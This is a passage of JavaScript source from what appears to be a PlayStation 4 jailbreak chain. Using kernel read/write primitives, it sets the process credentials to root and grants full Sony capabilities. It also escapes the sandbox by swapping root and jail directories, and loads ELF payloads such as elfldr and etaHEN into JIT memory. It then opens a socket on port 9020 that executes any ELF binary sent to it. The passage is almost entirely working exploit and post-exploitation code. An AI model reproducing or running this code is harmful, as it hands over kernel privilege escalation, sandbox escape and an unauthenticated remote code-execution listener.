        // Patch creds
        let cur_uid = await chain.syscall(SYS_GETUID);
        await log("Escalating creds... (current uid=0x" + cur_uid + ")", LogLevel.INFO);

        await krw.write4(krw.procUcredAddr.add32(0x04), 0); // cr_uid
        await krw.write4(krw.procUcredAddr.add32(0x08), 0); // cr_ruid
        await krw.write4(krw.procUcredAddr.add32(0x0C), 0); // cr_svuid
        await krw.write4(krw.procUcredAddr.add32(0x10), 1); // cr_ngroups
        await krw.write4(krw.procUcredAddr.add32(0x14), 0); // cr_rgid

        // Escalate sony privs
        await krw.write8(krw.procUcredAddr.add32(0x58), new int64(0x00000013, 0x48010000)); // cr_sceAuthId
        await krw.write8(krw.procUcredAddr.add32(0x60), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[0]
        await krw.write8(krw.procUcredAddr.add32(0x68), new int64(0xFFFFFFFF, 0xFFFFFFFF)); // cr_sceCaps[1]
        await krw.write1(krw.procUcredAddr.add32(0x83), 0x80);                              // cr_sceAttr[0]

        // Remove dynlib restriction
        let proc_pdynlib_offset = krw.curprocAddr.add32(0x3E8);
        let proc_pdynlib_addr = await krw.read8(proc_pdynlib_offset);

        let restrict_flags_addr = proc_pdynlib_addr.add32(0x118);
        await krw.write4(restrict_flags_addr, 0);

        let libkernel_ref_addr = proc_pdynlib_addr.add32(0x18);
        await krw.write8(libkernel_ref_addr, new int64(1, 0));

        cur_uid = await chain.syscall(SYS_GETUID);
        await log("We root now? uid=0x" + cur_uid, LogLevel.INFO);

        // Escape sandbox
        let is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("Jailbreaking... (in sandbox: " + is_in_sandbox + ")" , LogLevel.INFO);
        let rootvnode = await krw.read8(get_kaddr(OFFSET_KERNEL_ROOTVNODE));
        await krw.write8(krw.procFdAddr.add32(0x10), rootvnode); // fd_rdir
        await krw.write8(krw.procFdAddr.add32(0x18), rootvnode); // fd_jdir

        is_in_sandbox = await chain.syscall(SYS_IS_IN_SANDBOX);
        await log("We escaped now? in sandbox: " + is_in_sandbox, LogLevel.INFO);

        // Patch PS4 SDK version
        if (typeof OFFSET_KERNEL_PS4SDK != 'undefined') {
            await krw.write4(get_kaddr(OFFSET_KERNEL_PS4SDK), 0x99999999);
            await log("Patched PS4 SDK version to 99.99", LogLevel.INFO);
        }

        ///////////////////////////////////////////////////////////////////////
        // Stage 6: loader
        ///////////////////////////////////////////////////////////////////////

        let dlsym_addr = p.syscalls[SYS_DYNLIB_DLSYM];
        let jit_handle_store = p.malloc(0x4);
        // let test_store_buf   = p.malloc(0x4);

        // ELF sizes and offsets

        let OFFSET_ELF_HEADER_ENTRY = 0x18;
        let OFFSET_ELF_HEADER_PHOFF = 0x20;
        let OFFSET_ELF_HEADER_PHNUM = 0x38;

        let OFFSET_PROGRAM_HEADER_TYPE = 0x00;
        let OFFSET_PROGRAM_HEADER_FLAGS = 0x04;
        let OFFSET_PROGRAM_HEADER_OFFSET = 0x08;
        let OFFSET_PROGRAM_HEADER_VADDR = 0x10;
        let OFFSET_PROGRAM_HEADER_MEMSZ = 0x28;

        let OFFSET_RELA_OFFSET = 0x00;
        let OFFSET_RELA_INFO = 0x08;
        let OFFSET_RELA_ADDEND = 0x10;

        // ELF program header types
        let ELF_PT_LOAD = 0x01;
        let ELF_PT_DYNAMIC = 0x02;

        // ELF dynamic table types
        let ELF_DT_NULL = 0x00;
        let ELF_DT_RELA = 0x07;
        let ELF_DT_RELASZ = 0x08;
        let ELF_DT_RELAENT = 0x09;
        let ELF_R_AMD64_RELATIVE = 0x08;

        // ELF parsing
        var conn_ret_store = p.malloc(0x8);

        let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
        let mapping_addr = new int64(0x26100000, 0x00000009);

        let elf_program_headers_offset = 0;
        let elf_program_headers_num = 0;
        let elf_entry_point = 0;

        var parse_elf_store = async function (total_sz = -1) {
            // Parse header
            // These are global variables
            elf_program_headers_offset = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
            elf_program_headers_num = p.read4(elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
            elf_entry_point = p.read4(elf_store.add32(OFFSET_ELF_HEADER_ENTRY));

            if (elf_program_headers_offset != 0x40) {
                await log("    ELF header malformed, terminating connection.", LogLevel.ERROR);
                throw new Error("ELF header malformed, terminating connection.");
            }

            //await log("parsing ELF file (" + total_sz.toString(10) + " bytes)...");

            let text_segment_sz = 0;
            let data_segment_sz = 0;
            let rela_table_offset = 0;
            let rela_table_count = 0;
            let rela_table_size = 0;
            let rela_table_entsize = 0;
            let shadow_write_mapping = 0;

            // Parse program headers and map segments
            for (let i = 0; i < elf_program_headers_num; i++) {
                let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);

                let program_type = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
                let program_flags = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
                let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
                let program_vaddr = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
                let program_memsz = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
                let aligned_memsz = (program_memsz + 0x3FFF) & 0xFFFFC000;

                if (program_type == ELF_PT_LOAD) {
                    // For executable segments, we need to take some care and do alias'd mappings.
                    // Also, the mapping size is fixed at 0x100000. This is because jitshm requires to be aligned this way... for some dumb reason.
                    if ((program_flags & 1) == 1) {
                        // Executable segment
                        text_segment_sz = program_memsz;

                        // Get exec
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                        await chain.run();
                        let exec_handle = p.read4(jit_handle_store);

                        // Get write alias
                        chain.add_syscall_ret(jit_handle_store, SYS_JITSHM_ALIAS, exec_handle, 0x3);
                        await chain.run();
                        let write_handle = p.read4(jit_handle_store);

                        // Map to shadow mapping
                        chain.add_syscall_ret(conn_ret_store, SYS_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                        await chain.run();
                        shadow_write_mapping = p.read8(conn_ret_store);

                        // Copy in segment data
                        let dest = p.read8(conn_ret_store);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }

                        // Map executable segment
                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                        await chain.run();
                    } else {
                        // Regular data segment
                        // data_mapping_addr = mapping_addr.add32(program_vaddr);
                        data_segment_sz = aligned_memsz;

                        await chain.add_syscall_ret(conn_ret_store, SYS_MMAP, mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                        await chain.run();

                        // Copy in segment data
                        let dest = mapping_addr.add32(program_vaddr);
                        for (let j = 0; j < program_memsz; j += 0x8) {
                            let src_qword = p.read8(elf_store.add32(program_offset + j));
                            p.write8(dest.add32(j), src_qword);
                        }
                    }
                }

                if (program_type == ELF_PT_DYNAMIC) {
                    // Parse dynamic tags, the ones we truly care about are rela-related.
                    for (let j = 0x00; ; j += 0x10) {
                        let d_tag = p.read8(elf_store.add32(program_offset + j)).low;
                        let d_val = p.read8(elf_store.add32(program_offset + j + 0x08));

                        // DT_NULL means we reached the end of the table
                        if (d_tag == ELF_DT_NULL || j > 0x100) {
                            break;
                        }

                        switch (d_tag) {
                            case ELF_DT_RELA:
                                rela_table_offset = d_val.low;
                                break;
                            case ELF_DT_RELASZ:
                                rela_table_size = d_val.low;
                                break;
                            case ELF_DT_RELAENT:
                                rela_table_entsize = d_val.low;
                                break;
                        }
                    }
                }
            }

            // Process relocations if they exist
            if (rela_table_offset != 0) {
                let base_address = 0x1000;

                // The rela table offset from dynamic table is relative to the LOAD segment offset not file offset.
                // The linker script should guarantee it ends up in the first LOAD segment (code).
                rela_table_offset += base_address;

                // Rela count can be gotten from dividing the table size by entry size
                rela_table_count = rela_table_size / rela_table_entsize;

                // Parse relocs and apply them
                for (let i = 0; i < rela_table_count; i++) {
                    let r_offset = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_OFFSET));
                    let r_info = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_INFO));
                    let r_addend = p.read8(elf_store.add32(rela_table_offset + (i * rela_table_entsize) +
                        OFFSET_RELA_ADDEND));

                    let reloc_addr = mapping_addr.add32(r_offset.low);

                    // If the relocation falls in the executable section, we need to redirect the write to the
                    // writable shadow mapping or we'll crash
                    if (r_offset.low <= text_segment_sz) {
                        reloc_addr = shadow_write_mapping.add32(r_offset.low);
                    }

                    if ((r_info.low & 0xFF) == ELF_R_AMD64_RELATIVE) {
                        let reloc_value = mapping_addr.add32(r_addend.low); // B + A
                        p.write8(reloc_addr, reloc_value);
                    }
                }
            }
        }

        // reuse these plus we can more easily access them
        let rwpair_mem = p.malloc(0x8);
        let test_payload_store = p.malloc(0x8);
        let pthread_handle_store = p.malloc(0x8);
        let pthread_value_store = p.malloc(0x8);
        let args = p.malloc(0x8 * 6);

        var execute_elf_store = async function () {
            // zero out the buffers defined above
            p.write8(rwpair_mem, 0);
            p.write8(rwpair_mem.add32(0x4), 0);
            p.write8(test_payload_store, 0);
            p.write8(pthread_handle_store, 0);
            p.write8(pthread_value_store, 0);
            for (let i = 0; i < 0x8 * 6; i++) {
                p.write1(args.add32(i), 0);
            }

            // Pass master/victim pair to payload so it can do read/write
            p.write4(rwpair_mem.add32(0x00), krw.masterSock);
            p.write4(rwpair_mem.add32(0x04), krw.victimSock);

            // Arguments to entrypoint
            p.write8(args.add32(0x00), dlsym_addr);         // arg1 = dlsym_t* dlsym
            p.write8(args.add32(0x08), krw.pipeMem);        // arg2 = int *rwpipe[2]
            p.write8(args.add32(0x10), rwpair_mem);         // arg3 = int *rwpair[2]
            p.write8(args.add32(0x18), krw.pipeAddr);       // arg4 = uint64_t kpipe_addr
            p.write8(args.add32(0x20), krw.kdataBase);      // arg5 = uint64_t kdata_base_addr
            p.write8(args.add32(0x28), test_payload_store); // arg6 = int *payloadout

            // Execute payload in pthread
            await log("    Executing...", LogLevel.INFO);
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));

        }

        var wait_for_elf_to_exit = async function () {
            // Join pthread and wait until we're finished executing
            await chain.call(p.libKernelBase.add32(OFFSET_lk_pthread_join), p.read8(pthread_handle_store), pthread_value_store);
            let res = p.read8(test_payload_store).low << 0;
            await log("    Finished, out = 0x" + res.toString(16), LogLevel.LOG);

            return res;
        }

        var load_local_elf = async function (filename) {
            try {
                let total_sz = await load_payload_into_elf_store_from_local_file(filename);
                await parse_elf_store(total_sz);
                await execute_elf_store();
                return await wait_for_elf_to_exit();
            } catch (error) {
                await log("    Failed to load local elf: " + error, LogLevel.ERROR);
                return -1;
            }
        }

        if (await load_local_elf("elfldr.elf") == 0) {
            await log(`elfldr listening on ${ip.ip}:9021`, LogLevel.INFO);
            await new Promise(resolve => setTimeout(resolve, 8000));
            await load_local_elf("etaHEN.bin");
            await log(`EtaHEN Successfully Loaded`, LogLevel.INFO);
            EndTimer();
            is_elfldr_running = true;
        } else {
            await log("elfldr exited with non-zero code, port 9021 will likely not work", LogLevel.ERROR);
            await new Promise(resolve => setTimeout(resolve, 1000));
        }

        var elf_loader_socket_fd = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low;
        if (elf_loader_socket_fd <= 0) {
            throw new Error("Failed to create ELF loader socket");
        }

        var elf_loader_sock_addr_store = p.malloc(0x10, 1);
        build_addr(p, elf_loader_sock_addr_store, AF_INET, htons(9020), 0);

        let SOL_SOCKET = 0xFFFF;
        let SO_REUSEADDR = 0x0004;
        let opt_buf = p.malloc(0x4, 1);
        p.write4(opt_buf, 1);

        let setsockopt_res = (await chain.syscall(SYS_SETSOCKOPT, elf_loader_socket_fd, SOL_SOCKET, SO_REUSEADDR, opt_buf, 0x4)).low << 0;
        if (setsockopt_res < 0) {
            throw new Error("Failed to setsockopt on ELF loader socket");
        }

        let bind_res = (await chain.syscall(SYS_BIND, elf_loader_socket_fd, elf_loader_sock_addr_store, 0x10)).low << 0;
        if (bind_res < 0) {
            throw new Error("Failed to bind ELF loader socket");
        }

        let backlog = 16;
        let listen_res = (await chain.syscall(SYS_LISTEN, elf_loader_socket_fd, backlog)).low << 0;
        if (listen_res < 0) {
            throw new Error("Failed to listen on ELF loader socket");
        }

        var conn_addr_store = p.malloc(0x10, 1);
        var conn_addr_size_store = p.malloc(0x4, 1);

        var select_readfds_size = 1024 / 8;
        var select_readfds = p.malloc(select_readfds_size, 1);

        var timeout_size = 0x10; // 16 bytes
        var timeout = p.malloc(timeout_size);
        p.write8(timeout, 0); // tv_sec
        p.write8(timeout.add32(0x8), 50000); // tv_usec - 50000 us = 50 ms

        await log("elf loader listening on port 9020", LogLevel.INFO);
    }

    async function fstat(fd, stat_buf) {
        if (stat_buf.backing.byteLength < 0x78) {
            throw new Error("Stat buffer size too small");
        }

        let res = (await chain.syscall(SYS_FSTAT, fd, stat_buf)).low << 0;

        if (res < 0) {
            throw new Error("Error getting file status, res: " + res);
        }

        let st_rdev = p.read4(stat_buf.add32(20));

        let st_atim_tv_sec = p.read8(stat_buf.add32(24));
        let st_atim = new Date(st_atim_tv_sec.low * 1000 + st_atim_tv_sec.hi / 1000);

        let st_mtim_tv_sec = p.read8(stat_buf.add32(40));
        let st_mtim = new Date(st_mtim_tv_sec.low * 1000 + st_mtim_tv_sec.hi / 1000);

        let st_ctim_tv_sec = p.read8(stat_buf.add32(56));
        let st_ctim = new Date(st_ctim_tv_sec.low * 1000 + st_ctim_tv_sec.hi / 1000);

        let st_size = p.read8(stat_buf.add32(72));
        if (st_size.hi !== 0) {
            throw new Error("File size too large");
        }

        let st_blksize = p.read4(stat_buf.add32(88));

        let st_flags = p.read4(stat_buf.add32(92));

        let st_birthtim_tv_sec = p.read8(stat_buf.add32(104));
        let st_birthtim = new Date(st_birthtim_tv_sec.low * 1000 + st_birthtim_tv_sec.hi / 1000);

        return {
            st_rdev: st_rdev,
            st_atim: st_atim,
            st_mtim: st_mtim,
            st_ctim: st_ctim,
            st_size: st_size.low,
            st_blksize: st_blksize,
            fflags_t: st_flags,
            st_birthtim: st_birthtim,
        };
    }

    const DT_DIR = 4;

    async function ls(path, temp_buf) {
        if (!temp_buf.backing) {
            throw new Error("buffers backing js array not set");
        }
        let temp_buf_size = temp_buf.backing.byteLength;

        if (temp_buf_size < 0x108 || temp_buf_size < path.length + 1) {
            throw new Error("Temp buffer size too small");
        }

        if (path.endsWith("/") && path !== "/") {
            path = path.slice(0, -1);
        }

        // const DIRENT_SIZE = 0x108; // this is the max size, the string doesnt have a constant size

        let bufferDataView = new DataView(temp_buf.backing.buffer, temp_buf.backing.byteOffset, temp_buf_size);

        const O_DIRECTORY = 0x00020000;

        /** @type {{d_fileno: number, d_reclen: number, d_type: number, d_namlen: number, d_name: string}[]} */
        let result = [];

        p.writestr(temp_buf, path);

        let dir_fd = (await chain.syscall(SYS_OPEN, temp_buf, O_DIRECTORY)).low << 0;
        if (dir_fd < 0) {
            throw new Error(`Error opening directory '${path}' (not found, or not a directory)`);
        }

        try {
            // Get block size
            let stat = await fstat(dir_fd, temp_buf);

            let block_size = stat.st_blksize;

            if (block_size <= 0) {
                throw new Error("Invalid block size");
            }

            // for usbs getdirentries works with smaller buffers than block size but on the internal storage i get -1 if its smaller
            if (temp_buf_size < block_size) {
                throw new Error("Dirent buffer size too small, it has to be at least the fs block size which is " + block_size);
            }

            let total_bytes_read = 0;
            let total_files = 0;

            while (true) {
                // normally the getdirentries syscall reads and writes to basep, however it still works correctly with 0 passed, it seems if its 0 it uses lseek to keep track of pos between calls
                let bytes_read = (await chain.syscall(SYS_GETDIRENTRIES, dir_fd, temp_buf, temp_buf_size, 0)).low << 0;

                if (bytes_read < 0) {
                    throw new Error("Error reading directory");
                }

                if (bytes_read == 0) {
                    break;
                }

                let offset = 0;
                let loops = 0;
                while (offset < bytes_read) {
                    loops++;

                    let d_fileno = bufferDataView.getUint32(offset, true);
                    let d_reclen = bufferDataView.getUint16(offset + 4, true);
                    let d_type = bufferDataView.getUint8(offset + 6);
                    let d_namlen = bufferDataView.getUint8(offset + 7);
                    let d_name = "";
                    for (let i = 0; i < d_namlen; i++) {
                        d_name += String.fromCharCode(bufferDataView.getUint8(offset + 8 + i));
                    }

                    result.push({ d_fileno, d_reclen, d_type, d_namlen, d_name });

                    offset += d_reclen;
                    total_files++;
                }

                total_bytes_read += bytes_read;
            }

            return result;
        } finally {
            await chain.syscall(SYS_CLOSE, dir_fd);

            if (temp_buf.backing) {
                temp_buf.backing.fill(0);
            }
        }
    }

    async function delete_appcache(log = () => { }) {
        let user_home_entries = await ls("/user/home", elf_store);
        // if we're sandboxed we'll only have one
        let user_ids = user_home_entries.reduce((acc, dirent) => {
            if (dirent.d_type === DT_DIR && dirent.d_name !== "." && dirent.d_name !== "..") {
                let user_id = dirent.d_name;
                acc.push(user_id);
            }
            return acc;
        }, []);

        if (user_ids.length === 0) {
            throw new Error("No users found");
        }

        async function unlink(path) {
            p.writestr(elf_store, path);
            return await chain.syscall_int32(SYS_UNLINK, elf_store);
        }

        for (let user_id of user_ids) {
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-shm`);
            await unlink(`/user/home/${user_id}/webkit/shell/appcache/ApplicationCache.db-wal`);
            await log(`Deleted appcache files for user with id '${user_id}'`);
        }

        if (user_ids.length > 1) {
            await log(`Deleted appcache files for all ${user_ids.length} users`);
        }
    }

    async function send_buffer_to_port(buffer, size, port) {
        let sock = (await chain.syscall(SYS_SOCKET, AF_INET, SOCK_STREAM, 0)).low << 0;
        if (sock <= 0) {
            throw new Error("Failed to create socket");
        }

        build_addr(p, send_buffer_to_port.sock_addr_store, AF_INET, htons(port), 0x0100007F);

        let connect_res = (await chain.syscall(SYS_CONNECT, sock, send_buffer_to_port.sock_addr_store, 0x10)).low << 0;
        if (connect_res < 0) {
            await chain.syscall(SYS_CLOSE, sock);
            throw new Error("Failed to connect to port " + port);
        }

        let bytes_sent = 0;
        let write_ptr = buffer.add32(0x0);
        while (bytes_sent < size) {
            let send_res = (await chain.syscall(SYS_WRITE, sock, write_ptr, size - bytes_sent)).low << 0;
            if (send_res <= 0) {
                await chain.syscall(SYS_CLOSE, sock);
                throw new Error("Failed to send buffer to port " + port);
            }

            bytes_sent += send_res;
            write_ptr.add32inplace(send_res);
        }

        await chain.syscall(SYS_CLOSE, sock);
    }
    send_buffer_to_port.sock_addr_store = p.malloc(0x10, 1);

    sessionStorage.removeItem(SESSIONSTORE_ON_LOAD_AUTORUN_KEY);

    let ports = wkOnly ? "" : "9020";
    if (is_elfldr_running) {
        if (ports) {
            ports += ", ";
        }
        ports += "9021";
    }

    document.getElementById('top-bar-text').innerHTML = `Listening on: <span class="fw-bold">${ip.ip}</span> (port: ${ports}) (${ip.name})`;

    let queue = [];

    window.addEventListener(MAINLOOP_EXECUTE_PAYLOAD_REQUEST, async function (event) {
        let payload_info = event.detail;
        let toast = showToast(`${payload_info.displayTitle}: Waiting in queue...`, -1);
        queue.push({ payload_info, toast });
    });

    await new Promise(resolve => setTimeout(resolve, 300));
    await switchPage("payloads-view");


    while (true) {

        if (queue.length > 0) {

            let { payload_info, toast } = (queue.shift());

            try {
                if (payload_info.customAction) {
                    if (payload_info.customAction === CUSTOM_ACTION_APPCACHE_REMOVE) {
                        await delete_appcache(updateToastMessage.bind(null, toast));
                    } else {
                        throw new Error(`Unknown custom action: ${payload_info.customAction}`);
                    }
                } else {
                    updateToastMessage(toast, `${payload_info.displayTitle}: Fetching...`);
                    let total_sz = await load_payload_into_elf_store_from_local_file(payload_info.fileName);

                    if (!payload_info.toPort) {
                        if (wkOnly) {
                            throw new Error();
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Parsing...`);
                        await parse_elf_store(total_sz);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload running...`);
                        await execute_elf_store();
                        let out = await wait_for_elf_to_exit();

                        if (out !== 0) {
                            throw new Error('Payload exited with non-zero code: 0x' + out.toString(16));
                        }

                        updateToastMessage(toast, `${payload_info.displayTitle}: Payload exited with success code`);
                    } else {
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sending to port ${payload_info.toPort}...`);
                        await send_buffer_to_port(elf_store, total_sz, payload_info.toPort);
                        updateToastMessage(toast, `${payload_info.displayTitle}: Sent to port ${payload_info.toPort}`);
                    }
                }

            } catch (error) {
                updateToastMessage(toast, `${payload_info.displayTitle}: Error: ${error}`);
                setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
                continue;
            }

            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        }

        if (queue.length > 0) {
            continue; // prioritize actions before handling port 9020 stuff
        }

        if (wkOnly) { // in wk only mode i havent set up the socket since we cant load elfs anyway
            await new Promise(resolve => setTimeout(resolve, 50));
            continue;
        }

        select_readfds.backing.fill(0);
        select_readfds.backing[elf_loader_socket_fd >> 3] |= 1 << (elf_loader_socket_fd & 7);
        let select_res = (await chain.syscall(SYS_SELECT, elf_loader_socket_fd + 1, select_readfds, 0, 0, timeout)).low << 0;
        if (select_res < 0) {
            throw new Error("Select failed");
        } else if (select_res === 0) {
            continue;
        }

        let conn_fd = (await chain.syscall(SYS_ACCEPT, elf_loader_socket_fd, conn_addr_store, conn_addr_size_store)).low << 0;
        if (conn_fd < 0) {
            throw new Error("Failed to accept connection");
        }

        let toast = showToast("ELF Loader: Got a connection, reading...", -1);
        try {
            // Got a connection, read all we can
            let write_ptr = elf_store.add32(0x0);
            let total_sz = 0;
            while (total_sz < elf_store_size) {
                let read_res = (await chain.syscall(SYS_READ, conn_fd, write_ptr, elf_store_size - total_sz)).low << 0;
                if (read_res <= 0) {
                    break;
                }

                write_ptr.add32inplace(read_res);
                total_sz += read_res;
            }

            updateToastMessage(toast, "ELF Loader: Parsing ELF...");
            await parse_elf_store(total_sz);

            updateToastMessage(toast, "ELF Loader: Executing ELF...");
            await execute_elf_store();

            let out = await wait_for_elf_to_exit();
            if (out !== 0) {
                throw new Error('ELF Loader exited with non-zero code: 0x' + out.toString(16));
            }

            updateToastMessage(toast, "ELF Loader: Payload exited with success code");
            setTimeout(removeToast, TOAST_SUCCESS_TIMEOUT, toast);
        } catch (error) {
            updateToastMessage(toast, `ELF Loader: Error: ${error}`);
            setTimeout(removeToast, TOAST_ERROR_TIMEOUT, toast);
        } finally {
            await chain.syscall(SYS_CLOSE, conn_fd);
        }

    }

}

let fwScript = document.createElement('script');
document.body.appendChild(fwScript);
fwScript.setAttribute('src', `${window.fw_str}.js`);